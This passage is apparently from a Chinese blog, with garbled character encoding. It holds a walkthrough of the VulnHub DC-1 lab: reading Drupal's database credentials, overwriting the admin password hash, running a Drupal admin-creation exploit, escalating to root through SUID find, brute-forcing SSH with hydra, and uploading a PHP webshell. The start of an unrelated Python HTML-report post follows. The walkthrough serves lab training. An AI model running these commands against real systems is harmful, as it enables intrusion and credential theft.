sites<br>INSTALL.mysql.txt   MAINTAINERS.txt  flag1.txt    modules     themes<br>INSTALL.pgsql.txt   README.txt       includes     profiles    update.php<br>INSTALL.sqlite.txt  UPGRADE.txt      index.php    robots.txt  web.config<br>INSTALL.txt         authorize.php    install.php  scripts     xmlrpc.php<br>www-data@DC-1:/var/www$ cat flag1.txt   <br>cat flag1.txt<br>Every good CMS needs a config file - and so do you.<br></code></pre></td></tr></table></figure><p>ç™¾åº¦æŸ¥åˆ° Drupal çš„é»˜è®¤é…ç½®æ–‡ä»¶ä¸º <code>/var/www/sites/default/settings.php</code> ã€‚</p><p><a href="https://www.iteye.com/blog/justcoding-1407697">drupal7çš„ç›®å½•ç»“æ„åŠæœ¯è¯­ - Just Code - ITeyeåšå®¢</a></p><p>æŸ¥çœ‹ <code>./sites/default/settings.php</code> ï¼Œå¾—åˆ° flag2 å’Œæ•°æ®åº“è´¦å·å¯†ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/var/www$ cd sites<br>cd sites<br>www-data@DC-1:/var/www/sites$ ls<br>ls<br>README.txt  all  default  example.sites.php<br>www-data@DC-1:/var/www/sites$ cd default<br>cd default<br>www-data@DC-1:/var/www/sites/default$ ls<br>ls<br>default.settings.php  files  settings.php<br>www-data@DC-1:/var/www/sites/default$ cat settings.php<br>cat settings.php<br>&lt;?php<br><br>/**<br> *<br> * flag2<br> * Brute force and dictionary attacks aren&#x27;t the<br> * only ways to gain access (and you WILL need access).<br> * What can you do with these credentials?<br> *<br> */<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash">databases = array (</span><br>  &#x27;default&#x27; =&gt; <br>  array (<br>    &#x27;default&#x27; =&gt; <br>    array (<br>      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,<br>      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,<br>      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,<br>      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,<br>      &#x27;port&#x27; =&gt; &#x27;&#x27;,<br>      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,<br>      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,<br>    ),<br>  ),<br>);<br></code></pre></td></tr></table></figure><p>ç™»å½•æ•°æ®åº“ï¼ŒæŸ¥æ‰¾æœ‰ç”¨ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/var/www/sites/default$ mysql -udbuser -pR0ck3t<br>mysql -udbuser -pR0ck3t<br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 34839<br>Server version: 5.5.60-0+deb7u1 (Debian)<br><br>Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show databases;</span><br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| drupaldb           |<br>+--------------------+<br>2 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> use drupaldb</span><br>use drupaldb<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show tables;</span><br>show tables;<br>+-----------------------------+<br>| Tables_in_drupaldb          |<br>+-----------------------------+<br>| ......                      |<br>| users                       |<br>| ......                      |<br>| variable                    |<br>+-----------------------------+<br>80 rows in set (0.05 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select name,pass from users;</span>        <br>select name,pass from users;<br>+---------------------+---------------------------------------------------------+<br>| name                | pass                                                    |<br>+---------------------+---------------------------------------------------------+<br>| admin               | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |<br>| Fred                | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |<br>| crawlergo@gmail.com | $S$DpPx0Vh5tAyL9HA9HnThsFUIDl2RWa6qNxi4lVWmvcga3xtltPxb |<br>+---------------------+---------------------------------------------------------+<br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° admin ç”¨æˆ·çš„å¯†ç è¢«åŠ å¯†äº†çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•ä¿®æ”¹å¯†ç æˆ–æ–°å¢ä¸€ä¸ª admin æƒé™çš„ç”¨æˆ·ï¼š</p><p><strong>æ–¹æ³•ä¸€ï¼š</strong>ä¿®æ”¹ admin ç”¨æˆ·çš„å¯†ç </p><blockquote><p>å‚è€ƒï¼š<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fdrupalchina.cn%2Fnode%2F2128">å¿˜è®°Drupalçš„ç®¡ç†å‘˜å¯†ç çš„è§£å†³åŠæ³•</a></p></blockquote><p>ä½¿ç”¨ Drupal å¯¹æ•°æ®åº“çš„åŠ å¯†æ–¹æ³•ï¼Œç”Ÿæˆä¸€ä¸ªæ–°å¯†ç ï¼Œç„¶åæŠŠæ–°çš„å¯†ç æ›´æ–°åˆ° admin ç”¨æˆ·ï¼›æˆ–è€…ç›´æ¥æ³¨å†Œä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œå°†å…¶åŠ å¯†åçš„å¯†ç ç›´æ¥æ›¿æ¢åˆ° admin ç”¨æˆ·ã€‚</p><p>åŠ å¯†è„šæœ¬ä¸ºï¼š <code>/var/www/scripts/password-hash.sh</code> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">ww-data@DC-1:/var/www$ php scripts/password-hash.sh 123  <br>php scripts/password-hash.sh 123<br><br>password: 123           hash: $S$DKq7UGmp4iVzRUkizvlJH1h2.U6cOytmml9/ow7/SrAqUTsLqY46<br><br></code></pre></td></tr></table></figure><p>æ›¿æ¢ admin çš„å¯†ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">mysql&gt;</span><span class="bash"> select name,pass from users;</span><br>select name,pass from users;<br>+---------------------+---------------------------------------------------------+<br>| name                | pass                                                    |<br>+---------------------+---------------------------------------------------------+<br>| admin               | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |<br>| Fred                | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |<br>| crawlergo@gmail.com | $S$DpPx0Vh5tAyL9HA9HnThsFUIDl2RWa6qNxi4lVWmvcga3xtltPxb |<br>+---------------------+---------------------------------------------------------+<br>4 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> update users <span class="hljs-built_in">set</span> pass=<span class="hljs-string">&quot;$S<span class="hljs-variable">$DKq7UGmp4iVzRUkizvlJH1h2</span>.U6cOytmml9/ow7/SrAqUTsLqY46&quot;</span> <span class="hljs-built_in">where</span> name=<span class="hljs-string">&quot;admin&quot;</span>;</span><br>&lt;H1h2.U6cOytmml9/ow7/SrAqUTsLqY46&quot; where name=&quot;admin&quot;;                       <br>Query OK, 1 row affected (0.00 sec)<br>Rows matched: 1  Changed: 1  Warnings: 0<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select name,pass from users;</span><br>select name,pass from users;<br>+---------------------+---------------------------------------------------------+<br>| name                | pass                                                    |<br>+---------------------+---------------------------------------------------------+<br>| admin               | $S$DKq7UGmp4iVzRUkizvlJH1h2.U6cOytmml9/ow7/SrAqUTsLqY46 |<br>| Fred                | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |<br>| crawlergo@gmail.com | $S$DpPx0Vh5tAyL9HA9HnThsFUIDl2RWa6qNxi4lVWmvcga3xtltPxb |<br>+---------------------+---------------------------------------------------------+<br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒï¼š</strong>æ–°å¢ä¸€ä¸ª admin æƒé™çš„ç”¨æˆ·</p><p>åœ¨ exploitdb ä¸­æœ‰ä¸€ä¸ªé’ˆå¯¹ Drupal 7 ç‰ˆæœ¬çš„æ”»å‡»è„šæœ¬ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ª admin æƒé™çš„ç”¨æˆ·è´¦å·</p><p>æŸ¥çœ‹ Drupal ç‰ˆæœ¬,ç¡®å®š Drupal ç‰ˆæœ¬ä¸º7.24</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cat /var/www/includes/bootstrap.inc | grep VERSION<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾åˆ©ç”¨è„šæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ searchsploit drupal<br></code></pre></td></tr></table></figure><p>æ”»å‡»è„šæœ¬é€‚ç”¨äº 7.31 ä»¥ä¸‹ï¼Œæ‰€ä»¥é€‚åˆ 7.24 ç‰ˆæœ¬ï¼Œå¯ä»¥åˆ©ç”¨æ¼æ´å¢åŠ  admin æƒé™ç”¨æˆ·ï¼Œå¢åŠ æœ‰ admin æƒé™çš„ç”¨æˆ·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.135.147 -u admin1 -p admin1<br></code></pre></td></tr></table></figure><p>æˆåŠŸç™»å½•ï¼Œåœ¨ <code>Find content</code> é‡Œæ‰¾åˆ° <code>flag3</code> ï¼ŒæŸ¥çœ‹å¾—åˆ°æç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">flag3<br>Special PERMS will <span class="hljs-built_in">help</span> FIND the passwd - but yo<span class="hljs-string">u&#x27;ll need to -exec that command to work out how to get what&#x27;</span>s <span class="hljs-keyword">in</span> the shadow.<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ <code>/etc/passwd</code> ï¼Œå¾—çŸ¥æœ‰ä¸ªç”¨æˆ·ä¸º flag4ï¼Œåœ¨å…¶ç›®å½•ä¸‹æ‰¾åˆ° flag4.txt ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/var/www$ cat /etc/passwd<br>cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>......<br>mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false<br>flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash<br>www-data@DC-1:/var/www$ cd /home/flag4<br>cd /home/flag4<br>www-data@DC-1:/home/flag4$ ls<br>ls<br>flag4.txt<br>www-data@DC-1:/home/flag4$ cat flag4.txt<br>cat flag4.txt<br>Can you use this same method to find or access the flag in root?<br><br>Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?<br></code></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºï¼ŒçŒœæµ‹ <code>/root</code> ç›®å½•ä¸‹åº”è¯¥ä¹Ÿæœ‰ä¸ª flag ï¼ŒæŸ¥æ‰¾å‘ç° <code>/root/thefinalflag.txt</code> ï¼ŒæŸ¥çœ‹æƒé™ä¸å¤Ÿã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/home/flag4$ find /root<br>find /root<br>/root<br>/root/.profile<br>/root/.drush<br>/root/.drush/drush.complete.sh<br>......<br>/root/thefinalflag.txt<br>/root/.bash_history<br>/root/.bashrc<br>/root/.aptitude<br>/root/.aptitude/config<br>www-data@DC-1:/var/www$ cat /root/thefinalflag.txt<br>cat /root/thefinalflag.txt<br>cat: /root/thefinalflag.txt: Permission denied<br></code></pre></td></tr></table></figure><h3 id="2ã€SUIDææƒ"><a href="#2ã€SUIDææƒ" class="headerlink" title="2ã€SUIDææƒ"></a>2ã€SUIDææƒ</h3><blockquote><p><a href="https://www.jianshu.com/p/5ac4602b14c6">linux ææƒ-SUIDææƒ - ç®€ä¹¦ (jianshu.com)</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/84872644">(4æ¡æ¶ˆæ¯) Linuxä¸‹ç”¨SUIDææƒ_è°¢å…¬å­çš„åšå®¢-CSDNåšå®¢ suidææƒ</a></p></blockquote><p><strong>ä»€ä¹ˆæ˜¯SUIDï¼Ÿ</strong></p><p>SUID (Set UID) æ˜¯Linuxä¸­çš„ä¸€ç§ç‰¹æ®Šæƒé™,å…¶åŠŸèƒ½ä¸ºç”¨æˆ·è¿è¡ŒæŸä¸ªç¨‹åºæ—¶ï¼Œå¦‚æœè¯¥ç¨‹åºæœ‰SUIDæƒé™ï¼Œé‚£ä¹ˆç¨‹åºè¿è¡Œä¸ºè¿›ç¨‹æ—¶ï¼Œè¿›ç¨‹çš„å±ä¸»ä¸æ˜¯å‘èµ·è€…ï¼Œè€Œæ˜¯ç¨‹åºæ–‡ä»¶æ‰€å±çš„å±ä¸»ã€‚ä½†æ˜¯SUIDæƒé™çš„è®¾ç½®åªé’ˆå¯¹äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶,å¯¹äºéå¯æ‰§è¡Œæ–‡ä»¶è®¾ç½®SUIDæ²¡æœ‰ä»»ä½•æ„ä¹‰ã€‚</p><p>åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨è€…ä¼šæš‚æ—¶è·å¾—è¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…æƒé™,ä¸”è¯¥æƒé™åªåœ¨ç¨‹åºæ‰§è¡Œçš„è¿‡ç¨‹ä¸­æœ‰æ•ˆ. é€šä¿—çš„æ¥è®²,å‡è®¾æˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ls,å…¶å±ä¸»ä¸ºroot,å½“æˆ‘ä»¬é€šè¿‡érootç”¨æˆ·ç™»å½•æ—¶,å¦‚æœlsè®¾ç½®äº†SUIDæƒé™,æˆ‘ä»¬å¯åœ¨érootç”¨æˆ·ä¸‹è¿è¡Œè¯¥äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶,åœ¨æ‰§è¡Œæ–‡ä»¶æ—¶,è¯¥è¿›ç¨‹çš„æƒé™å°†ä¸ºrootæƒé™ã€‚</p><p><img src="https://img-blog.csdnimg.cn/a21acef9394946e684c2f109744486a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASWVya2VV,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p><p><strong>SUIDå¯ä»¥è®©è°ƒç”¨è€…ä»¥æ–‡ä»¶æ‹¥æœ‰è€…çš„èº«ä»½è¿è¡Œè¯¥æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨SUIDææƒçš„æ€è·¯å°±æ˜¯è¿è¡Œrootç”¨æˆ·æ‰€æ‹¥æœ‰çš„SUIDçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿è¡Œè¯¥æ–‡ä»¶çš„æ—¶å€™å°±å¾—è·å¾—rootç”¨æˆ·çš„èº«ä»½äº†ã€‚</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> æŸ¥æ‰¾å…·æœ‰rootæƒé™çš„SUIDçš„æ–‡ä»¶</span><br><span class="hljs-meta">#</span><span class="bash"> å¯ä»¥çœ‹åˆ°findå‘½ä»¤å…·æœ‰SUIDæƒé™ï¼Œå¦‚æœfindä»¥SUIDæƒé™è¿è¡Œï¼Œæ‰€æœ‰é€šè¿‡findæ‰§è¡Œçš„å‘½ä»¤éƒ½ä¼šä»¥rootæƒé™è¿è¡Œã€‚</span><br>www-data@DC-1:/home/flag4$ find / -perm -u=s -type f 2&gt;/dev/null<br><br>www-data@DC-1:/home/flag4$ ls -al /usr/bin/find<br>ls -al /usr/bin/find<br>-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> æŸ¥æ‰¾æ ¹ç›®å½•ä¸‹åä¸º thefinalflag.txt çš„æ–‡ä»¶å¹¶æ‰§è¡Œ shell</span><br><span class="hljs-meta">#</span><span class="bash"> -<span class="hljs-built_in">exec</span> å‚æ•°åé¢è·Ÿçš„æ˜¯<span class="hljs-built_in">command</span>å‘½ä»¤ï¼Œå®ƒçš„ç»ˆæ­¢æ˜¯ä»¥;ä¸ºç»“æŸæ ‡å¿—çš„ï¼Œæ‰€ä»¥è¿™å¥å‘½ä»¤åé¢çš„åˆ†å·æ˜¯ä¸å¯ç¼ºå°‘çš„ï¼Œè€ƒè™‘åˆ°å„ä¸ªç³»ç»Ÿä¸­åˆ†å·ä¼šæœ‰ä¸åŒçš„æ„ä¹‰ï¼Œæ‰€ä»¥åœ¨åˆ†å·å‰é¢åŠ åæ–œæ ã€‚</span><br>www-data@DC-1:/var/www$ find / -name thefinalflag.txt -exec &quot;/bin/sh&quot; \;    <br>find / -name thefinalflag.txt -exec &quot;/bin/sh&quot; \;<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>whoami<br>root<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>id<br>uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)<br><span class="hljs-meta">#</span><span class="bash"> cat /root/thefinalflag.txt</span>                                <br>cat /root/thefinalflag.txt<br>Well done!!!!<br><br>Hopefully you&#x27;ve enjoyed this and learned some new skills.<br><br>You can let me know what you thought of this little journey<br>by contacting me via Twitter - @DCAU7<br><span class="hljs-meta">#</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>1ã€CMSï¼šDrupal 7 é…ç½®æ–‡ä»¶ã€å¯†ç åŠ å¯†æ–¹å¼åŠå…¶ç›¸å…³æ¼æ´</p><p>2ã€msf</p><p>3ã€æ•°æ®åº“</p><p>4ã€SUID ææƒ</p><h2 id="äº”ã€å…¶ä»–"><a href="#äº”ã€å…¶ä»–" class="headerlink" title="äº”ã€å…¶ä»–"></a>äº”ã€å…¶ä»–</h2><p><strong>çˆ†ç ´ SSHï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> -l æŒ‡å®šç ´è§£çš„ç”¨æˆ·-P æŒ‡å®šå¯†ç å­—å…¸ssh://ip æŒ‡å®šä½¿ç”¨åè®®å’Œipåœ°å€</span><br><span class="hljs-meta">$</span><span class="bash"> sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt 192.168.135.147 ssh</span><br><span class="hljs-meta">#</span><span class="bash"> æˆ–è€…</span><br><span class="hljs-meta">$</span><span class="bash"> sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.135.147</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> ä½¿ç”¨å¾—åˆ°ç”¨æˆ·åå¯†ç ã€flag4/orangeã€‘, è¿œç¨‹è¿æ¥é¶æœº</span><br><span class="hljs-meta">$</span><span class="bash"> ssh flag4@192.168.135.147</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br><span class="hljs-meta">$</span><span class="bash"> cat flag4.txt</span><br></code></pre></td></tr></table></figure><p><strong>ä¸Šä¼ å†°èé©¬è·å– shell</strong>ï¼š</p><p>åˆ©ç”¨ meterperter çš„ shell ç›´æ¥ä¸Šä¼ å†°èçš„ shellï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterperter&gt; upload /home/kali/Desktop/shell.php /var/www/shell.php<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pythonåˆ¶ä½œHTMLæŠ¥å‘Š</title>
    <link href="/2022/06/11/Code/Python/Python%E5%88%B6%E4%BD%9CHTML%E6%8A%A5%E5%91%8A/"/>
    <url>/2022/06/11/Code/Python/Python%E5%88%B6%E4%BD%9CHTML%E6%8A%A5%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<h1 id="Pythonåˆ¶ä½œHTMLæŠ¥å‘Š"><a href="#Pythonåˆ¶ä½œHTMLæŠ¥å‘Š" class="headerlink" title="Pythonåˆ¶ä½œHTMLæŠ¥å‘Š"></a>Pythonåˆ¶ä½œHTMLæŠ¥å‘Š</h1><blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://zhuanlan.zhihu.com/p/341869724">ç”¨Pythonåˆ¶ä½œä¸€ä»½HTMLæŠ¥å‘Š - çŸ¥ä¹ (zhihu.com)</a></p></blockquote><p>å¤šå­¦ä¹ ï¼Œå°‘æ¯”æ¯”ã€‚</p><blockquote><p>æœ¬æ–‡ä½¿ç”¨ <a href="https://zhuanlan.zhihu.com/p/106057556">Zhihu On VSCode</a> åˆ›ä½œå¹¶å‘å¸ƒ</p></blockquote><p>åˆšåˆšå†™å¥½äº†ä¸€ä¸ªåˆ¶ä½œæŠ¥å‘Šçš„Pythonç¨‹åºï¼Œåˆ†äº«ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯ä½œä¸ºè‡ªå·±çš„ç¬”è®°ï¼šï¼ˆå‡ ä¹ï¼‰æ²¡æœ‰ä»»ä½•å‰ç«¯åŸºç¡€ï¼Œç”¨Pythonåˆ¶ä½œä¸€ä»½HTMLçš„æ•°æ®æŠ¥å‘Šã€‚æ—¢å¯ä»¥åšä¸ºç½‘é¡µå‘å¸ƒåˆ°ç½‘ç«™ä¸Šï¼Œä¹Ÿå¯ä»¥æ‰“å°æˆPDFã€‚</p><h2 id="ä¸€ã€ç”¨Markdownåˆ¶ä½œä¸€ä¸ªç½‘é¡µæ¨¡æ¿"><a href="#ä¸€ã€ç”¨Markdownåˆ¶ä½œä¸€ä¸ªç½‘é¡µæ¨¡æ¿" class="headerlink" title="ä¸€ã€ç”¨Markdownåˆ¶ä½œä¸€ä¸ªç½‘é¡µæ¨¡æ¿"></a>ä¸€ã€ç”¨Markdownåˆ¶ä½œä¸€ä¸ªç½‘é¡µæ¨¡æ¿</h2><p>ç¬¬ä¸€æ­¥æ˜¯åˆ¶ä½œä¸€ä¸ªç½‘é¡µæ¨¡æ¿ã€‚å¦‚æœæœ‰å‰ç«¯æŠ€æœ¯ï¼Œå½“ç„¶å¯ä»¥ç”¨htmlå’ŒCSSåšå‡ºä¸€ä¸ªæ¼‚äº®çš„æ¨¡æ¿ã€‚æˆ–è€…ä¹Ÿå¯ä»¥åœ¨ç½‘ä¸Šæ‰¾åˆ°åˆé€‚çš„æ¨¡æ¿ã€‚ä½†æ˜¯æˆ‘ç”¨äº†æœ€ç®€å•çš„æ–¹æ³•ï¼šåœ¨VScodeé‡Œç”¨Markdownå†™ä¸€ä»½ç®€å•çš„æ¨¡æ¿ï¼Œå¹¶ç”¨Markdown Preview Enhancedæ’ä»¶ä¿å­˜ä¸ºhtmlæ ¼å¼ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–å–œæ¬¢çš„Markdownç¬”è®°è½¯ä»¶ï¼Œå¦‚Typoraä¹‹ç±»çš„ï¼Œå¤§å¤šæœ‰å¯¼å‡ºhtmlçš„åŠŸèƒ½ã€‚æ‰€ä»¥æœ€åhtmlçš„æ ·å¼å°±å–å†³äºè¿™äº›è½¯ä»¶çš„æ¸²æŸ“ç»“æœäº†ã€‚</p><p>å†™æ¨¡æ¿çš„æ—¶å€™æŠŠéœ€è¦æ’å…¥æ–‡å­—ã€è¡¨æ ¼ã€å›¾ç‰‡ç­‰å†…å®¹çš„åœ°æ–¹ç”¨ä¸¤å±‚å¤§æ‹¬å· {{ }}æ‹¬èµ·æ¥ï¼Œåç»­æ’å…¥å†…å®¹ã€‚</p><p>å¦å¤–ï¼Œåœ¨å¼€å¤´æ’å…¥ä¸€æ®µplotlyçš„æºç åœ°å€ï¼Œåé¢å°†ä¼šç”¨plotlyç”»å›¾ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 